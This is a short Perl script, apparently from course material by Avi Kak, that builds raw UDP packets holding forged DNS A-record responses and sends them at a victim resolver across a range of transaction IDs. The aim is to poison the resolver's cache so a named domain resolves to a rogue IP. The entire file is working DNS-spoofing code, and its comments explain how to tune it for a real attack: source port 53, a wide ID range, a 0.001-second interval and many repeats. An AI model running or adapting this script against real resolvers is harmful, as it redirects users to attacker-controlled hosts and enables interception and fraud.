#!/usr/bin/perl -w

##  dns_fake_response.pl
##  Author: Avi Kak  (March 27, 2011)

##  Shows you how you can put on the wire UDP packets that could
##  potentially be a response to a DNS query emanating from a client name
##  resolver or a DNS caching nameserver.  This script repeatedly sends out 
##  UDP packets, each packet with a different DNS transaction ID. The DNS Address 
##  Record (meaning a Resource Record of type A) contained in the data payload
##  of every UDP packet is the same --- the fake IP address for a domain.

##  This script must be executed as root as it seeks to construct a socket of
##  type RawIP

##  Additionally, you need to first install the libnet-dns-perl library from
##  Synaptic package manager for the Net::DNS module called below.



use Net::DNS;                                                                     #(A)
use Net::RawIP;                                                                   #(B)
use strict;                                                                       #(C)

my $sourceIP   = '192.168.1.106';  # IP address of the attacking host             #(D)
my $destIP     = '192.168.1.100';  # IP address of the victim host                #(E)
                                   #  (If victim host is in your LAN, this must be a 
                                   #   valid IP in your LAN since otherwise ARP 
                                   #   would not be able to get a valid MAC address 
                                   #   and the UDP datagram would have nowhere to go)

my $destPort   = 23456;      # change it to whatever client resolver is using     #(F)
my $sourcePort = 5353;       # change it to 53 for actual attacks                 #(G)

#  Transaction IDs to use: 
my @spoofing_set = 34000..34001;     # Make it to be a large and apporpriate      #(H)
                                     # range for a real attack

my $domain_name="moonshine.ecn.purdue.edu";   # The name of the domain whose IP   #(I)
                                              # address you want to spoof with a  
                                              # rogue IP address in the cache of 
                                              # client resolver or a caching 
                                              # nameserver
my $rougeIP='192.168.1.101';        # See the comment above                       #(J)

my @udp_packets;           # This will be the collection of DNS response packets  #(K)
                           # with each packet using a different transaction ID

foreach my $dns_trans_id (@spoofing_set) {                                        #(L)
    my $udp_packet = new Net::RawIP({ip=> {saddr=>$sourceIP, daddr=>$destIP},     #(M)
                                 udp=>{source=>$sourcePort, dest=>$destPort}});   #(N)

    # Prepare DNS fake reponse data for the UDP packet:
    my $dns_packet = Net::DNS::Packet->new($domain_name, "A", "IN");              #(O)
    $dns_packet->header->qr(1);       # for a DNS reponse packet                  #(P)
    print "constructing dns packet for id: $dns_trans_id\n";
    $dns_packet->header->id($dns_trans_id);                                       #(Q)
    $dns_packet->print;
    $dns_packet->push("pre", rr_add($domain_name . ". 86400 A " . $rougeIP));     #(R)
    my $udp_data = $dns_packet->data;                                             #(S)

    # Insert fake DNS data into the UDP packet:
    $udp_packet->set({udp=>{data=>$udp_data}});                                   #(T)
    push @udp_packets, $udp_packet;                                               #(U)
}

my $interval = 1;       # for the number of seconds between successive            #(V)
                        # transmissions of the UDP reponse packets.
                        # Make it 0.001 for a real attack.  The value of 1
                        # is good for dubugging.

my $repeats = 2;        # Give it a large value for a real attack                 #(W)
my $attempt = 0;                                                                  #(X)
while ($attempt++ < $repeats) {                                                   #(Y)
    foreach my $udp_packet (@udp_packets) {                                       #(Z)
        $udp_packet->send();                                                      #(a)
        sleep $interval;                                                          #(b)
    }
}
